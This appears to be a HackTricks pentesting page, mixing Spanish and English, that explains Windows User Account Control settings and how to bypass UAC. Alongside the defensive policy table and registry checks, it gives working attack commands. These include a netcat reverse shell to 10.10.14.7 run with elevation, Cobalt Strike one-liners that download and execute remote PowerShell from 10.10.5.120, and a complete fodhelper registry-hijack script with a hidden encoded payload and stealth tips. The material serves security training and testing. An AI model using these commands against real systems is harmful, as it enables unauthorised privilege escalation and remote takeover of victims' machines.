# UAC - Control de cuentas de usuario

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita una **solicitud de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían potencialmente comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administradora** a menos que un administrador autorice explícitamente a estas aplicaciones/tareas a tener acceso a nivel administrador para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.

Para más info sobre los niveles de `integrity`:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está activo, a un usuario administrador se le asignan 2 tokens: uno de usuario estándar, para realizar acciones normales a nivel regular, y otro con privilegios de administrador.

Esta [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC de forma específica para su organización a nivel local (usando secpol.msc), o configurarlo y desplegarlo mediante Group Policy Objects (GPO) en un entorno de dominio de Active Directory. Los distintos ajustes se analizan en detalle [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                               |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                               |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                               |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                   |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                   |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                   |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                   |

### UAC Bypass Theory

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Many auto-elevate processes expose **funcionalidad vía COM objects o RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.

Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.

Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like System32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.

Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).

### Check UAC

Para confirmar si UAC está habilitado, ejecuta:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si es **`1`** entonces UAC está **activado**, si es **`0`** o no existe, entonces UAC está **inactivo**.

Luego, comprueba **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass de UAC

> [!TIP]
> Ten en cuenta que si tienes acceso gráfico a la víctima, el bypass de UAC es sencillo ya que puedes simplemente hacer clic en "Sí" cuando aparece el aviso de UAC

El bypass de UAC es necesario en la siguiente situación: **el UAC está activado, tu proceso se está ejecutando en un contexto de integridad medio, y tu usuario pertenece al grupo de Administradores**.

Es importante mencionar que es **mucho más difícil bypassear el UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### UAC desactivado

Si UAC ya está desactivado (`ConsentPromptBehaviorAdmin` es **`0`**) puedes **ejecutar un reverse shell con privilegios de administrador** (nivel de integridad alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** básico UAC "bypass" (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que pertenece al grupo Administrators puedes **montar el recurso compartido C$** vía SMB (sistema de archivos) local en un nuevo disco y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta de inicio de Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** del **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varios UAC bypass exploits. Tenga en cuenta que necesitará **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitará saber **cuál necesita.**\
Debería **tener cuidado** porque algunos **bypasses** provocarán que **otros programas** muestren avisos que **alertarán** al **usuario** de que algo está ocurriendo.

UACME indica la **versión de compilación a partir de la cual cada técnica empezó a funcionar**. Puede buscar una técnica que afecte a sus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario confiable `fodhelper.exe` se eleva automáticamente en Windows modernos. Cuando se ejecuta, consulta la ruta del registro por usuario que aparece abajo sin validar el verbo `DelegateExecute`. Plantar un comando allí permite que un proceso Medium Integrity (el usuario está en Administrators) inicie un proceso High Integrity sin un UAC prompt.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Pasos de PowerShell (configura tu payload, luego actívalo):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es predeterminado/leniente (no Always Notify con restricciones extras).
- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
- Payload puede ser cualquier comando (PowerShell, cmd, o la ruta de un EXE). Evita UIs que requieran interacción para mantener el sigilo.

#### More UAC bypass

**All** the techniques used here to bypass UAC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

Puedes obtenerla usando una sesión **meterpreter**. Migra a un **process** que tenga el valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### UAC Bypass with GUI

Si tienes acceso a una **GUI puedes simplemente aceptar el prompt de UAC** cuando aparezca, no necesitas realmente un bypass. Por tanto, obtener acceso a una GUI te permitirá bypassear el UAC.

Además, si consigues una sesión GUI que alguien estaba usando (potencialmente vía RDP) hay **algunas herramientas que se ejecutarán como administrador** desde las cuales podrías **ejecutar** un **cmd** por ejemplo **como admin** directamente sin que UAC te vuelva a pedir confirmación, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto puede ser un poco más **sigiloso**.

### Noisy brute-force UAC bypass

Si no te importa ser ruidoso siempre puedes **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **solicita elevar permisos hasta que el usuario lo acepte**.

### Your own bypass - Basic UAC bypass methodology

Si miras **UACME** notarás que **la mayoría de los bypasses de UAC abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encuentra un binario que **autoelevate** (verifica que cuando se ejecuta corre en un nivel de integridad alto).
2. Con procmon busca "**NAME NOT FOUND**" eventos que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente necesitarás **escribir** la DLL dentro de algunos **protected paths** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes bypassear esto usando:
1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un CAB file dentro de protected paths (porque esta herramienta se ejecuta desde un nivel de integridad alto).
2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro del path protegido y ejecutar el binario vulnerable y autoelevated.

### Another UAC bypass technique

Consiste en observar si un **autoElevated binary** intenta **leer** del **registro** el **name/path** de un **binary** o **command** a **ejecutar** (esto es más interesante si el binary busca esta información dentro de **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
